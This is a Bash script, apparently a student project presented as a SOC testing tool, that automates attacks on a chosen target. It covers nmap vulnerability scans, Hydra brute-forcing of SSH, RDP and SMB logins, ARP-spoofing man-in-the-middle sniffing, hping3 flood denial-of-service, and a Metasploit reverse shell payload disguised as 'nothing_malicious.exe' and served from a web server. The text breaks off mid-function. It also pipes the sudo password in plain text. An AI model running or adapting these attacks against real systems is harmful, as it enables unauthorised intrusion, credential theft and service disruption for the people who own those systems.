
#!/bin/bash
#--------------------------------------------------------------------------------
#	soc_checker.sh (For Linux)
#	Creator: Zi_WaF
#	Group: Centre for Cybersecurity (CFC311022)
#	Lecturer: J. Lim
#	whatis: soc_checker.sh	An automatic program to be used by the SOC Manager. The script will allow the Administrator to choose different types of attacks.
#
#	To run: bash soc_checker.sh
#--------------------------------------------------------------------------------
function trap_all(){  			# set up for any interruptions and exit program cleanly
		logger "[SIGINT soc_checker.sh]: Program Interrupted."
		rm -f /tmp/local.net &>/dev/null
		rm -f /tmp/bf.txt &>/dev/null
		rm -f /tmp/dos_scan.txt &>/dev/null && rm -f /tmp/dos_scan2.txt &>/dev/null
		while [ "$(sysctl net.ipv4.ip_forward)" = "net.ipv4.ip_forward = 1" ];do
		echo $pass | sudo -S sysctl -w net.ipv4.ip_forward=0 1>/dev/null	# reset ip_forwarding back to 0
		done
		rm -f ./nothing_malicious.exe &>/dev/null
		echo $pass | sudo -S rm -f /var/www/html/nothing_malicious.exe &>/dev/null
		rm -f ./handler.rc &>/dev/null
		echo $pass | sudo -S service postgresql stop &>/dev/null
		echo $pass | sudo -S service $web_server stop &>/dev/null
		rm -f nmap_result.gnmap &>/dev/null && rm -f nmap_result.nmap &>/dev/null && rm -f nmap_result.xml &>/dev/null
		if [ -d $(find ~ -type d -name "CVE-2020-1472") ];then
			cd $(find ~ -type d -name "CVE-2020-1472")
			echo $pass | sudo -S apt-get remove --purge impacket-scripts python3-impacket &>/dev/null
			cd ..
			echo $pass | sudo -S rm -rf CVE-2020-1472 &>/dev/null
		fi
		rm -f /tmp/dc_scan.txt &>/dev/null
		rm -f /tmp/dc_test.txt &>/dev/null
		exit
}
function logger(){				# logging of time stamp, user & event
	echo $pass | sudo -S touch /var/log/soc_checker.log			# create a log
	echo $pass | sudo -S chmod 777 /var/log/soc_checker.log		# allow permission to write
	echo $pass | sudo -S echo -e "$(date "+%a %b %d %T %p") $(hostname) $1" >> /var/log/soc_checker.log	# date and event
	echo $pass | sudo -S chmod 644 /var/log/soc_checker.log		# stop logging
}
function quit_soc(){			# clean exit of program
	logger "[Stop soc_checker.sh]: Quit Program."
	rm -f /tmp/local.net &>/dev/null
	rm -f /tmp/bf.txt &>/dev/null
	rm -f /tmp/dos_scan.txt &>/dev/null && rm -f /tmp/dos_scan2.txt &>/dev/null
	rm -f ./nothing_malicious.exe &>/dev/null
	echo $pass | sudo -S rm -f /var/www/html/nothing_malicious.exe &>/dev/null
	rm -f ./handler.rc &>/dev/null
	echo $pass | sudo -S service postgresql stop &>/dev/null
	echo $pass | sudo -S service $web_server stop &>/dev/null
	rm -f nmap_result.gnmap &>/dev/null && rm -f nmap_result.nmap &>/dev/null && rm -f nmap_result.xml &>/dev/null
	if [ -d $(find ~ -type d -name "CVE-2020-1472") ];then
			cd $(find ~ -type d -name "CVE-2020-1472")
			echo $pass | sudo -S apt-get remove --purge impacket-scripts python3-impacket &>/dev/null
			cd ..
			echo $pass | sudo -S rm -rf CVE-2020-1472 &>/dev/null
	fi
	rm -f /tmp/dc_scan.txt &>/dev/null
	rm -f /tmp/dc_test.txt &>/dev/null
	exit
}
function nmap_scan(){			# nmap scan
	echo "Checking... Please wait."									# checking for nmap
	if [ "$(which nmap)" = "/usr/bin/nmap" ]
	then
		:
	else
		echo $pass | sudo -S apt-get install nmap -y #1>/dev/null
	fi
	if [ "$(which gnome-terminal)" = "/usr/bin/gnome-terminal" ]	# check if gnome-terminal is installed
	then
		:
	else
		echo $pass | sudo -S apt-get install gnome-terminal -y #1>/dev/null
	fi
	if [ "$(which git)" = "/usr/bin/git" ]							# check if git is installed
	then
		:
	else
		echo $pass | sudo -S apt-get install git -y #1>/dev/null
	fi
	if [ "$(which searchsploit)" = "/usr/bin/searchsploit" ]		# check if searchsploit is installed
	then
		:
	else
		echo $pass | sudo -S git clone https://github.com/offensive-security/exploit-database.git #1>/dev/null
		echo $pass | sudo -S apt-get install exploitdb -y #1>/dev/null
	fi
	echo $pass | sudo -S updatedb 1>/dev/null
	# nmap scan (Quick/Normal/Deep/Specific Ports/Vulnerability/View Result)
	tput reset && cat /tmp/local.net
	while true
	do	
		if [ "$choice" = "r" ];then 		#  for random nmap
			scan=$(random_function "1 2 3 5")
		else
			echo -e "\033[1m\e[4m\nNmap Scan\033[0m\e[0m"
			echo -e "Nmap is a network scanning tool — used for network exploration and host discovery.\nThe options below allows user to do a Quick/Normal/Deep/Vuln scan,\nor scan specific ports on your Target."
			echo -e "\nNmap Scan Options: \n\t[1] Quick Scan (Fast) \n\t[2] Normal Scan (Service)\n\t[3] Deep Scan (OS and Service)\n\t[4] Specify your Ports\n\t[5] Vuln Scan (Vulnerability Scan)\n\t[6] View Result \n\t[7] Go back to Main Menu \n\t[8] Exit the Program\n" && read -p "Choose your option (To go back to main menu, enter \"b\"): " scan
		fi
		case $scan in
			1) 	# Quick Scan
				echo -e "\033[1m\e[4m\n$(date "+%a %b %d %T %p") [Nmap Scan] Nmap Quick Scan (Fast) on $IP\033[0m\e[0m" | tee -a soc_checker_results.txt
				logger "[Nmap Scan]: Quick Scan on $IP (Start)"
				echo $pass | sudo -S nmap $IP -Pn -sS -T4 -F -vv | tee -a soc_checker_results.txt
				logger "[Nmap Scan]: Quick Scan on $IP (Complete)"
				echo -e "\nResult saved to \033[1msoc_checker_results.txt\033[0m."
				choice="";;
				
			2) 	# Normal Scan
			 	echo -e "\033[1m\e[4m\n$(date "+%a %b %d %T %p") [Nmap Scan] Normal Scan (Service) on $IP\033[0m\e[0m" | tee -a soc_checker_results.txt
				logger "[Nmap Scan]: Normal Scan on $IP (Start)"
				echo $pass | sudo -S nmap $IP -Pn -sS -sV -vv | tee -a soc_checker_results.txt
				logger "[Nmap Scan]: Normal Scan on $IP (Complete)"
				echo -e "\nResult saved to \033[1msoc_checker_results.txt\033[0m."
				choice="";;
				
			3) 	# Deep Scan 	
				echo -e "\033[1m\e[4m\n$(date "+%a %b %d %T %p") [Nmap Scan] Deep Scan (OS and Service) on $IP\033[0m\e[0m" | tee -a soc_checker_results.txt
				logger "[Nmap Scan]: Deep Scan on $IP (Start)"
				echo "Scanning... Please wait."
				echo $pass | sudo -S nmap $IP -Pn -sT -A -vv | tee -a soc_checker_results.txt
				logger "[Nmap Scan]: Deep Scan on $IP (Complete)"
				echo -e "\nResult saved to \033[1msoc_checker_results.txt\033[0m."
				choice="";;
				
			4) 	# Specific Ports	
				read -p "Specify port number(s) separated by a 'comma' (e.g 80,53,443, or range 23-60): " ports
				echo -e "\033[1m\e[4m\n$(date "+%a %b %d %T %p") [Nmap Scan] Deep Scan (OS and Service) on $IP Port(s): $ports\033[0m\e[0m" | tee -a soc_checker_results.txt
				logger "[Nmap Scan]: Deep Scan on $IP Port(s) $ports (Start)"
				echo "Scanning... Please wait."
				echo $pass | sudo -S nmap $IP -p $ports -Pn -sV --version-all -A -vv | tee -a soc_checker_results.txt
				logger "[Nmap Scan]: Deep Scan on $IP Port(s) $ports (Complete)"
				echo -e "\nResult saved to \033[1msoc_checker_results.txt\033[0m."
				;;
				
			5) 	# Vulnerability Scan
				echo -e "\033[1m\e[4m\n$(date "+%a %b %d %T %p") [Nmap Scan] Vulnerability Scan on $IP\033[0m\e[0m" | tee -a soc_checker_results.txt
				logger "[Nmap Scan]: Vulnerability Scan on $IP (Start)"
				echo "Scanning... Please wait."
				#echo $pass | sudo -S nmap $IP -sV -p 21,22,25,53,80,88,110,123,135,139,143,179,389,443,445,464,465,488,500,587,593,631,636,993,995,1187,1436,1746,3268,3269,3389,3603,5985,7734,8080,9389,16361,47001,49664,49665,49666,49667,49669,49670,49674,49677,49686,49740,49793,62673 --script vuln -T4 -v -oA nmap_result | tee -a soc_checker_results.txt
				echo $pass | sudo -S nmap $IP -sV -p- --script=vuln -v -oA nmap_result | tee -a soc_checker_results.txt
				logger "[Nmap Scan]: Vulnerability Scan on $IP (Complete)" 
				gnome-terminal --tab --title="Searchsploit $IP" --wait -- bash -c "searchsploit --nmap nmap_result.xml | tee -a soc_checker_results.txt; exec bash"
				echo -e "\nResult saved to \033[1msoc_checker_results.txt\033[0m."
				rm -f nmap_result.gnmap &>/dev/null && rm -f nmap_result.nmap &>/dev/null && rm -f nmap_result.xml &>/dev/null
				choice="";;
			
			6)	# View Result
				if [ -f "$(pwd)/soc_checker_results.txt" ];then cat $(pwd)/soc_checker_results.txt; echo -e "\nPress Enter to continue." && read -r
				else echo -e "\n\t\t\033[1mResult not available.\033[0m";echo -e "\nPress Enter to continue." && read -r;fi;;
				
			7|b) # Go back to Start Menu
				tput reset && start_menu
				break;;
				
			8|quit|q) # Exit the program
				quit_soc;;
				
			*) if [ -z "$choice" ]
				then
					:
				else
					echo "Please enter the Nmap Scan option. To quit, enter \"q\" or \"quit\"."
					continue
				fi ;;
		esac
	done
}
function brute_force(){			# brute force login credentials
	function hydra(){ 					
		rm -r /tmp/bf.txt 2>/dev/null
		tput reset
		function attempt(){				# if successful attempt or not
			if [ -z "$(cat /tmp/bf.txt | grep -w "successfully")" ];then
			echo -e "NONE\n";else echo -e "$(cat /tmp/bf.txt | grep -w "successfully")" ;fi
		}
		while true
		do
			echo -e "\033[1m\nTarget IP\033[0m: $IP"
			echo -e "\033[1mUsername List\033[0m: $user_path"
			echo -e "\033[1mPassword List\033[0m: $pswd_path"
			if [ -f "$1" ] && [ -f "$2" ]	# check that username list and password list exists
			then
				if [ "$choice" = "r" ];then	# for random selection
					service=$(random_function "1 2 3")
				else
					echo -e "\n\033[1mChoose the Service to Brute-Force Login Credentials\033[0m: \n\t[1] Secure Shell (SSH) \n\t[2] Remote Dektop Protocol (RDP) \n\t[3] Server Message Block (SMB) \n\t[4] Create Username List. \n\t[5] Create Password List \n\t[6] View Result \n\t[7] Go back to Main Menu \n\t[8] Exit the Program\n"
					read -p "Choose your option (To go back to main menu, enter \"b\"): " service
				fi
				while true
				do 
				case $service in
					1) 	# Secure Shell (SSH) Brute-Force Login Credentials
						echo -e "\033[1m\e[4m\n$(date "+%a %b %d %T %p") Secure Shell (SSH) on $IP\033[0m\e[0m" | tee -a soc_checker_results.txt
						logger "[Brute-Force]: Secure Shell (SSH) on $IP (Start)"
						echo $pass | sudo -S hydra -L "$1" -P "$2" "$IP" ssh -vV | tee -a soc_checker_results.txt /tmp/bf.txt
						echo -e "\n[SUCCESSFUL]: $(attempt)" | tee -a soc_checker_results.txt && cat /tmp/bf.txt | grep -w "\[ssh\]" | tee -a soc_checker_results.txt
						logger "[Brute-Force]: Secure Shell (SSH) on $IP (Complete)"
						echo -e "Result saved to \033[1msoc_checker_results.txt\033[0m."
						rm -r /tmp/bf.txt 2>/dev/null
						choice=""
						break;;
					
					2) 	# Remote Desktop Protocol (RDP) Brute-Force Login Credentials
						echo -e "\033[1m\e[4m\n$(date "+%a %b %d %T %p") Remote Desktop Protocol (RDP) on $IP\033[0m\e[0m" | tee -a soc_checker_results.txt
						logger "[Brute-Force]: Remote Desktop Protocol (RDP) on $IP (Start)"
						echo $pass | sudo -S hydra -L "$1" -P "$2" "$IP" rdp -vV | tee -a soc_checker_results.txt /tmp/bf.txt
						echo -e "\n[SUCCESSFUL]: $(attempt)" | tee -a soc_checker_results.txt && cat /tmp/bf.txt | grep -w host | tee -a soc_checker_results.txt
						logger "[Brute-Force]: Remote Desktop Protocol (RDP) on $IP (Complete)"
						echo -e "Result saved to \033[1msoc_checker_results.txt\033[0m."
						rm -r /tmp/bf.txt 2>/dev/null
						choice=""
						break;;
					
					3) 	# Server Message Block (SMB) Brute-Force Login Credentials
						echo -e "\033[1m\e[4m\n$(date "+%a %b %d %T %p") Server Message Block (SMB) on $IP\033[0m\e[0m" | tee -a soc_checker_results.txt
						logger "[Brute-Force]: Server Message Block (SMB) on $IP (Start)"
						echo $pass | sudo -S hydra -L "$1" -P "$2" "$IP" smb -vV | tee -a soc_checker_results.txt /tmp/bf.txt
						echo -e "\n[SUCCESSFUL]: $(attempt)" | tee -a soc_checker_results.txt && cat /tmp/bf.txt | grep -w "\[smb\]" | tee -a soc_checker_results.txt
						logger "[Brute-Force]: Server Message Block (SMB) on $IP (Complete)"
						echo -e "Result saved to \033[1msoc_checker_results.txt\033[0m."
						rm -r /tmp/bf.txt 2>/dev/null
						choice=""
						break;;
					
					4)	# Create Username List
						choice=""
						create_list_username
						break;;
					
					5)	# Create Password List
						choice=""
						create_list_username
						break;;
					
					6) 	# View Result
						if [ -f "$(pwd)/soc_checker_results.txt" ];then cat $(pwd)/soc_checker_results.txt; echo -e "\nPress Enter to continue." && read -r
						else echo -e "\n\t\t\033[1mResult not available.\033[0m";echo -e "\nPress Enter to continue." && read -r;fi
						break;;
										
					7|b) # Go back to Start Menu
						choice=""
						tput reset && start_menu
						break;;
					
					8|quit|q) # Exit the program
						choice=""
						quit_soc
						break;;
					
					*) 	if [ -z "$service" ]
						then
							:
							break
						else
							echo "Please enter the Brute-Force Login Credentials option. To quit, enter \"q\" or \"quit\"."
							break
						fi ;;
				esac
			done	
			
			elif [ -f "$1" ]			# if username list was specified but password list is not
			then
				echo -e "\n\t\t\033[1mPassword list not specified!\033[0m"
				specify_password
			elif [ -f "$2" ]			# if password list was specified but username list is not
			then
				echo -e "\n\t\t\033[1mUsername list not specified!\033[0m"
				specify_username
			fi
		done
	}
	function create_list_username(){	# create username list
			echo -e "\n\033[1mCreate a list of usernames.\033[0m To skip, press [Enter]."
			read -p "Please add usernames separated by 'space' (e.g. John Scott Delores): " username
			if [ -z "$username" ];then :; else
				logger "[Brute-Force]: Creating a list of usernames. (Start)"
				for name in $username;do echo $name >> username.lst;done
					logger "[Brute-Force]: Usernames added to $(pwd)/username.lst. (Complete)"
					echo -e "Usernames added to \033[1musername.lst\033[0m.";fi
			specify_username			
	}
	function create_list_password(){	# create password list
			echo -e "\n\033[1mCreate a list of passwords.\033[0m To skip, press [Enter]."
			read -p "Please add passwords separated by 'space' (e.g kali Passw0rd! ubuntu): " password
			if [ -z "$password" ];then :; else 
				logger "[Brute-Force]: Creating a list of passwords. (Start)"
				for pswd in $password;do echo $pswd >> password.lst;done
					logger "[Brute-Force]: Passwords added to $(pwd)/password.lst. (Complete)"
					echo -e "Passwords added to \033[1mpassword.lst\033[0m.";fi
			specify_password
	}
	function specify_username(){		# specify path of username list
		while true
		do
			echo -e "\n\033[1m  Specify the list of username.\033[0m\n  To use default, press [Enter]. (To go back to main menu, enter \"b\")."
			read -p "  Specify the absolute file path of usernames list. (Default: ./username.lst): " user_path
			if [ -f "$user_path" ]		# if path of username list exist
			then
				break
			elif [ -z "$user_path" ] && [ -f "$(pwd)/username.lst" ]		# if default path of username list exist
			then
				user_path="$(pwd)/username.lst"
				break
			elif [ "$user_path" = "b" ]									# return back to main menu
			then
				tput reset && start_menu
				break
			else
				echo -e "\n\t\t\033[1mUsername List do not exist!\033[0m"	# if path of username list do not exist
				create_list_username										# prompt to create username list
				break
			fi
		done
	}	
	function specify_password(){		# specify path of password list
		while true
		do	
			echo -e "\n\033[1m  Specify the list of password.\033[0m\n  To use default, press [Enter]. (To go back to main menu, enter \"b\")."
			read -p "  Specify the absolute path of passwords list. (Default: ./password.lst): " pswd_path
			if [ -f "$pswd_path" ]		# if path of password list exist
			then
				break
			elif [ -z "$pswd_path" ] && [ -f "$(pwd)/password.lst" ]		# if default path of password list exist
			then
				pswd_path="$(pwd)/password.lst"
				break
			elif [ "$pswd_path" = "b" ]									# return back to main menu
			then
				tput reset && start_menu
				break
			else
				echo -e "\n\t\t\033[1mPassword List do not exist!\033[0m"	# if path of username list do not exist
				create_list_password										# prompt to create username list
				break
			fi
		done
	}
	# checking for hydra
	echo "Checking... Please wait."
	if [ "$(which hydra)" = "/usr/bin/hydra" ]
	then
		:
	else
		echo $pass | sudo -S apt-get install hydra-gtk -y 1>/dev/null
	fi
	echo $pass | sudo -S updatedb 1>/dev/null
	tput reset
	cat /tmp/local.net
	echo -e "\033[1m\e[4m\nBrute-Force Login Credentials\033[0m\e[0m"
	echo -e "Hydra is a brute-forcing tool that helps crack the credentials of network services.\nTo use: You need to specify the path of a list of usernames and passwords.\nOr, you can create the lists."
	echo -e "Once both username and password list path are specified, you choose the type of Service to brute-force for login credentials."
	user_path="<Not Specified>"
	pswd_path="<Not Specified>"
	echo -e "\033[1m\nTarget IP\033[0m: $IP"
	echo -e "\033[1mUsername List\033[0m: $user_path"
	echo -e "\033[1mPassword List\033[0m: $pswd_path"
	if [ "$choice" = "r" ];then 		#  for random brute-force
		echo "John Scott Delores Fabian soc1 soc2 soc3 soc7 Admin Administrator DC tc IEUser admin web Ubuntu kali" | tr ' ' '\n' >> username.lst
		echo "Boy123 Girl123 tc admin administrator password Password Passw0rd! pass 1 ubuntu kali" | tr ' ' '\n' >> password.lst
		user_path="$(pwd)/username.lst"
		pswd_path="$(pwd)/password.lst"
		hydra "$user_path" "$pswd_path"
	elif [ "$user_path" = "<Not Specified>" ] && [ "$pswd_path" = "<Not Specified>" ];then		#  if username list and password list not specified
		echo -e "\033[1m\n\tBrute-Force Login Credentials requires Username List and Password List.\033[0m"
		specify_username
		specify_password
		hydra "$user_path" "$pswd_path"
	fi
}
function mitm(){				# Man-in-the-Middle (on Windows)
	echo $choice
	echo "Checking... Please wait."
	if [ "$(which dsniff)" = "/usr/sbin/dsniff" ]							# check if dsniff is installed
	then
		:
	else
		echo $pass | sudo -S apt-get install dsniff -y #1>/dev/null
	fi
	if [ "$(which driftnet)" = "/usr/bin/driftnet" ]						# check if driftnet is installed
	then
		:
	else
		echo $pass | sudo -S apt-get install driftnet -y #1>/dev/null
	fi
	if [ "$(which gnome-terminal)" = "/usr/bin/gnome-terminal" ]			# check if gnome-terminal is installed
	then
		:
	else
		echo $pass | sudo -S apt-get install gnome-terminal -y #1>/dev/null
	fi
	echo $pass | sudo -S updatedb 1>/dev/null
	function mitm_connect(){
		echo $pass | sudo -S sysctl -w net.ipv4.ip_forward=1 1>/dev/null		# set ip_forwarding
		sysctl -p
		if [ "$(sysctl net.ipv4.ip_forward)" = "net.ipv4.ip_forward = 1" ];then
			logger "[MitM]: Successfully set IP Fowarding on host machine. (Success)"
			logger "[MitM]: Initiated. Begin sniffing between $IP (Target) and $gateway (Router)"
			echo -e "\n\t\033[1m[Initiating Man-in-the-Middle Mode]\033[0m"		# open new terminals for urlsnarf and driftnet
			gnome-terminal --tab --title="$IP to $gateway" -- bash -c "echo $pass | sudo -S arpspoof -t $IP $gateway" 
			gnome-terminal --tab --title="$gateway to $IP" -- bash -c "echo $pass | sudo -S arpspoof -t $gateway $IP" 
			echo -e "\033[1m\e[4m\n$(date "+%a %b %d %T %p") [MitM] (urlSnarf) on $IP (Target) and $gateway (Router)\033[0m\e[0m" >> soc_checker_results.txt
			echo -e "\nResult (from urlSnarf) will be saved to \033[1msoc_checker_results.txt\033[0m."
			gnome-terminal --tab --title="MitM urlSnarf" -- bash -c "echo $pass | sudo -S urlsnarf -i $interface | tee -a soc_checker_results.txt" 
			gnome-terminal --tab --title="MitM driftnet" --wait -- bash -c "echo $pass | sudo -S driftnet -i $interface"
			logger "[MitM]: Man-in-the-Middle Mode between $IP (Target) and $gateway (Router) (Complete)"
			
			while [ "$(sysctl net.ipv4.ip_forward)" = "net.ipv4.ip_forward = 1" ];do
				echo $pass | sudo -S sysctl -w net.ipv4.ip_forward=0 1>/dev/null	# reset ip_forwarding back to 0
			done
			echo -e "\nPress Enter to continue." && read -r
			start_menu																# return to menu
		else																		# if ip_forwarding failed
			echo "Unable to perform this attack. Failed to set IP Fowarding on host machine."
			logger "[MitM]: Failed to set IP Fowarding on host machine. (Failed)"
			choice=""
			start_menu
		fi
	}
	tput reset
	echo -e "\033[1m\e[4mMan-in-the-Middle Attack\033[0m\e[0m"
	echo -e "Man-in-the-Middle or MitM, intercepts and relays messages between two parties who believe they are communicating directly with each other."
	echo -e "To use: It will set a connection between target and the gateway, intercepting communication between the two.\n"
	gateway=$(route -n | grep UG | awk '{print $2}')
	interface=$(route -n | grep UG | awk '{print $NF}')
	while true ;do
		if [ "$choice" = "r" ];then			# for random attack
			mitm_connect && break
		else								# proceed to set connection
			read -p "Set the connection between $IP (Target) and $gateway (Router). Continue? (Y/n) " chosen
			if [ "$chosen" = "y" ] || [ "$chosen" = "yes" ] || [ -z "$chosen" ];then
				mitm_connect && break
			elif [ "$chosen" = "n" ] || [ "$chosen" = "no" ] || [ "$chosen" = "b" ];then
				start_menu && break			# go back to start menu
			else
				:
			fi
		fi
	done
}
function dos_attack(){			# Denial-of-Service (DOS) Attack
	function dos_type(){	# DOS Specify Port & Type of Attack
		tput reset
		while true;do
			if [ "$choice" = "r" ];then			# for random DOS Attack
				port=$(random_function "21 22 25 53 80 389 443 3389")
				dos=$(random_function "1 2 3")
			else
				echo -e "\033[1m\e[4m\nDOS Attack\033[\033[0m\e[0m"
				echo -e "A Denial-of-Service (DoS) attack is an attack meant to shut down a machine or network\nby sending high volume of packets, making it inaccessible to its intended users."
				echo "To use: You need to specify the Port Number to DOS Attack, and then choose the type of Flood Attack."
				echo -e "\n\033[1m*[Warning]* DOS Attack will increase Host CPU Load.\033[0m"
				echo -e "\033[1m\nTarget IP\033[0m: $IP\n"
				cat /tmp/dos_scan.txt
				echo ""
				read -p "Specify a port number to attack (To go back to main menu, enter \"b\"): " port
				while true;do 					# Port number to DOS Attack
					if [ "$port" = "b" ];then
						start_menu && break
					elif [[ "$port" =~ ^[0-9]+$ && "$port" -ge 1 && "$port" -le 65535 ]];then
						break
					else
						read -p "Specify a port number to attack (To go back to main menu, enter \"b\"): " port
					fi
				done
				echo -e "\033[1m\nTarget IP\033[0m: $IP"
				echo -e "\033[1mTarget Port\033[0m: $port\n"
				echo -e "\033[1mChoose type of DOS Attack\033[0m: \n\t[1] ICMP Flood Attack (Ping of Death) \n\t[2] SYN Flood Attack \n\t[3] LAN Denial (LAND) Attack\n\t[4] Specify a different port number. \n\t[5] Go back to Main Menu. \n\t[6] Exit the Program.\n"
				read -p "Choose your option (To go back to main menu, enter \"b\"): " dos
			fi
			case $dos in										#  DOS Type (ICMP/SYN/LAND)
				1) 	# ICMP Flood (Ping of Death)
					echo -e "\n\033[1m  [Initiating ICMP Flood Attack on $IP Port: $port]\033[0m\n"
					gnome-terminal --tab --title="[Initiating ICMP Flood Attack on $IP Port: $port]" --wait -- bash -c "echo $pass | sudo -S hping3 -1 -d 100000 $IP -p $port --flood"
					logger "[DOS Attack]: Initiated ICMP Flood Attack on $IP Port: $port (Complete)"
					#echo $pass | sudo -S xterm -hold -e "sudo hping3 -1 -d 100000 $IP -p $port --flood" &
					choice="" 
					echo -e "Press Enter to continue." && read -r
					;;
					
				2) 	# SYN Flood Attack
					echo -e "\n\033[1m  [Initiating SYN Flood Attack on $IP Port: $port]\033[0m\n"
					gnome-terminal --tab --title="[Initiating SYN Flood Attack on $IP Port: $port]" --wait -- bash -c "echo $pass | sudo -S hping3 -d 100000 -S $IP -p $port --flood"
					logger "[DOS Attack]: Initiated SYN Flood Attack on $IP Port: $port (Complete)"
					#echo $pass | sudo -S xterm -hold -e "sudo hping3 -d 100000 -S $IP -p $port --flood" &
					choice="" 
					echo -e "Press Enter to continue." && read -r
					;;	
						
				3) 	# LAN Denial (LAND) Attack
					echo -e "\n\033[1m  [Initiating LAND Attack on $IP Port: $port]\033[0m\n"
					gnome-terminal --tab --title="[Initiating LAND Attack on $IP Port: $port]" --wait -- bash -c "echo $pass | sudo -S hping3 -d 100000 -S $IP -a $IP -s $port -p $port --flood"
					#echo $pass | sudo -S xterm -hold -e "sudo hping3 -d 100000 -S $IP -a $IP -s $port -p $port --flood" &
					logger "[DOS Attack]: Initiated LAND Attack on $IP Port: $port (Complete)"
					choice="" 
					echo -e "Press Enter to continue." && read -r
					;;
						
				4) # Specify a different port number.
					choice=""
					dos_type && break
					;;
					
				5|b) 	# Go back to Start Menu
					rm -r /tmp/dos_scan.txt &>/dev/null && rm -r /tmp/dos_scan2.txt &>/dev/null
					choice=""
					tput reset && start_menu && break;;
							
				6|quit|q) # Exit the program
					rm -r /tmp/dos_scan.txt &>/dev/null && rm -r /tmp/dos_scan2.txt &>/dev/null
					quit_soc
					;;
			esac
		done
		rm -r /tmp/dos_scan.txt &>/dev/null && rm -r /tmp/dos_scan2.txt &>/dev/null
	}
	# Menu of DOS Attack
	rm -r /tmp/dos_scan.txt &>/dev/null && rm -r /tmp/dos_scan2.txt &>/dev/null
	echo "Checking... Please wait."
	if [ "$(which gnome-terminal)" = "/usr/bin/gnome-terminal" ]			# check if gnome-terminal is installed
	then
		:
	else
		echo $pass | sudo -S apt-get install gnome-terminal -y #1>/dev/null
	fi
	if [ "$(which nmap)" = "/usr/bin/nmap" ]								# check if nmap is installed
		then
			:
		else
			echo $pass | sudo -S apt-get install nmap -y #1>/dev/null
	fi
	if [ "$(which hping3)" = "/usr/sbin/hping3" ]							# check if hping3 is installed
		then
			:
		else
			echo $pass | sudo -S apt-get install hping3 -y #1>/dev/null
	fi
	echo $pass | sudo -S updatedb 1>/dev/null
	tput reset
	echo -e "\033[1m\nTarget IP\033[0m: $IP\n"
	echo -ne " \033[1mScanning... Please wait.\033[0m\r"					# check for open port for DOS attack
	echo $pass | sudo -S nmap $IP -Pn -v -p 21,22,25,53,80,88,110,123,135,139,143,179,389,443,445,464,465,488,500,587,593,631,636,993,995,1187,1436,1746,3268,3269,3389,3603,5985,7734,8080,9389,16361,47001,49664,49665,49666,49667,49669,49670,49674,49677,49686,49740,49793,62673 > /tmp/dos_scan.txt
	logger "[DOS Attack]: Nmap Scan on $IP (Complete)"
	cat /tmp/dos_scan.txt | grep -w open | grep -v Discovered > /tmp/dos_scan2.txt
	dos_open=$(cat /tmp/dos_scan.txt | grep -w open | grep -v Discovered)
	if [ "$choice" = "r" ]; then											# random dos attack will auto-choose a port
			cat /tmp/dos_scan2.txt | grep -w open | grep -v Discovered > /tmp/dos_scan.txt
			dos_type
			rm -r /tmp/dos_scan.txt &>/dev/null && rm -r /tmp/dos_scan2.txt &>/dev/null
	elif [ -z "$dos_open" ];then											# check if open port is available for DOS attack
		echo -e "\033[1m\e[4mOpen Port(s)\033[0m\e[0m: [NONE]              " | tee /tmp/dos_scan.txt
		echo -e "No open Port on $IP.\nFirewall enabled. DOS Attack will have zero effect." | tee -a /tmp/dos_scan.txt
		echo "" && read -p "Still proceed anyway? [Y/n]: " answer
		case $answer in 
			y|yes|Yes) dos_type;;
			n|no|No|nO|b) rm -r /tmp/dos_scan.txt &>/dev/null && rm -r /tmp/dos_scan2.txt &>/dev/null
						start_menu;;
			*) dos_type;;
		esac
	else																	# open ports available for DOS attack
		echo -e "\033[1m\e[4mOpen Port(s)\033[0m\e[0m              " > /tmp/dos_scan.txt
		cat /tmp/dos_scan2.txt >> /tmp/dos_scan.txt
		dos_type
		rm -r /tmp/dos_scan.txt &>/dev/null && rm -r /tmp/dos_scan2.txt &>/dev/null
	fi
}
function reverse_shell(){		# Reverse Shell
	function handler(){										# using metasploit start listening
		echo "use exploit/multi/handler" > handler.rc		# to automate metasploit
		echo "set payload windows/meterpreter/reverse_tcp" >> handler.rc
		echo "set LHOST $host_ip" >> handler.rc
		echo "set LPORT 6666" >> handler.rc
		echo "run" >> handler.rc
		echo $pass | sudo -S service postgresql start		
		postg=$(sudo service postgresql status | grep -w "active (exited)")
		while [ -z "$postg" ];do
			echo $pass | sudo -S service postgresql start
			echo -e "\tRestarting Metasploit..."
			postg=$(sudo service postgresql status | grep -w "active (exited)");done
		echo -e "\nStarting Metasploit... Listening on Port: 6666"	# start metasploit and begin listening
		logger "[Reverse Shell]: Started Metasploit on $host_ip. Listening on Port: 6666 (Complete)"
		echo -e "\033[1m\e[4m\n$(date "+%a %b %d %T %p") [Reverse Shell] Started Metasploit on $host_ip. Listening on Port: 6666\033[0m\e[0m" >> soc_checker_results.txt
		gnome-terminal --tab --title="Metasploit on $host_ip. Listening on Port: 6666" --wait -- bash -c "msfconsole -r ./handler.rc | tee -a soc_checker_meterpreter.txt; exec bash"
		#echo $pass | sudo -S xterm -hold -e "msfconsole -r handler.rc | tee -a soc_checker_results.txt"
		echo -e "\nResult saved to \033[1msoc_checker_meterpreter.txt\033[0m."
		rm -r ./nothing_malicious.exe &>/dev/null
		echo $pass | sudo -S rm -r /var/www/html/nothing_malicious.exe &>/dev/null
		rm -r ./handler.rc &>/dev/null
		echo $pass | sudo -S service postgresql stop &>/dev/null
		logger "[Reverse Shell]: Stopped Metasploit on $host_ip. (Complete)"
		echo $pass | sudo -S service $web_server stop &>/dev/null
		logger "[Reverse Shell]: Stopped $web_server web service on $host_ip (Complete)"
		echo -e "\nPress Enter to continue." && read -r
		start_menu
	}
	function reverse_payload(){								# create reverse tcp payload
		msfvenom -p windows/meterpreter/reverse_tcp lhost=$host_ip lport=6666 -f exe -o nothing_malicious.exe
		logger "[Reverse Shell]: Payload created. Saved as 'nothing_malicious.exe'. (Complete)"
		echo -e "\033[1m\nHost IP\033[0m: $host_ip"
		echo -e "\033[1mListening Port\033[0m: 6666"
		echo $pass | sudo -S mv ./nothing_malicious.exe /var/www/html
		echo -e "\033[1mPayload\033[0m: 'nothing_malicious.exe' moved to /var/www/html."	
		logger "[Reverse Shell]: Payload: 'nothing_malicious.exe' moved to /var/www/html. (Complete)"
		web_server=$(echo $pass | sudo -S service --status-all | grep "apache2\|nginx" | head -n 1 | awk '{print $NF}')
		echo $pass | sudo -S service $web_server start		# Start web server on host machine
		status=$(sudo service $web_server status | grep -w "active (running)")
		while [ -z "$status" ];do
			echo $pass | sudo -S service $web_server start
			echo -e "\tRestarting Web Server..."
			status=$(sudo service apache2 status | grep -w "active (running)");done
		logger "[Reverse Shell]: Started $web_server web service on $host_ip (Complete)"
